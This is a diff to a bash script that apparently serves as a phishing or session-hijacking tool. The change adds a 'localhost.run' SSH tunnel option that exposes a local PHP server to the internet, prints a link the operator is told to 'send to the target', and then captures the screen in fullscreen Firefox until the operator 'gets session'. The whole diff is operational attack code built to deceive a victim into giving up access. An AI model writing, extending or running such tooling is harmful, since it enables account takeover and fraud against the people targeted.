@@ -47,7 +47,7 @@ scrot_screen() {
 
 
 firefox $website &
-sleep 40
+sleep 30
 xdotool key "F11"
 sleep 5
 while [ true ]; do
@@ -117,7 +117,31 @@ scrot_screen
 
 }
 
+serverlrun(){
+printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+sleep 2
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting 'localhost.run' server...\e[0m\n"
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 nokey@localhost.run 2> /dev/null > sendlink ' &
+printf "\n"
+sleep 10 # &
+send_link=$(grep -o "https://[0-9a-z]*\.lhr\.life" sendlink)
+printf "\n"
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Memorize this link to send to the target:\e[0m\e[1;77m %s \n' $send_link
+printf "\n"
+printf "\e[1;77m[!] Now, we will open Firefox in fullscreen mode. Send the link to target after that.\e[0m"
+read -p $'\e[1;77m Ok?\e[0m' -n 1 -r
+printf "\e[1;77m[!] After you get session, close this script with Ctrl + C, \e[0m"
+read -p $'\e[1;77mOk?\e[0m' -n 1 -r
+printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Firefox...\e[0m\n'
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Use F11 to exit fullscreen mode\e[0m\n'
+scrot_screen
 
+}
 
 start() {
 
@@ -181,8 +205,9 @@ if [[ -e tmp.jpg ]]; then
 rm -rf tmp.jpg
 fi
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunneling, Best!)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m localhost.run (SSH Tunneling, Best!)\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
 option_server="${option_server:-${default_option_server}}"
@@ -193,6 +218,9 @@ serverx
 elif [[ $option_server == 2 || $option_server == 02 ]]; then
 website
 start
+elif [[ $option_server == 3 || $option_server == 03 ]]; then
+website
+serverlrun
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
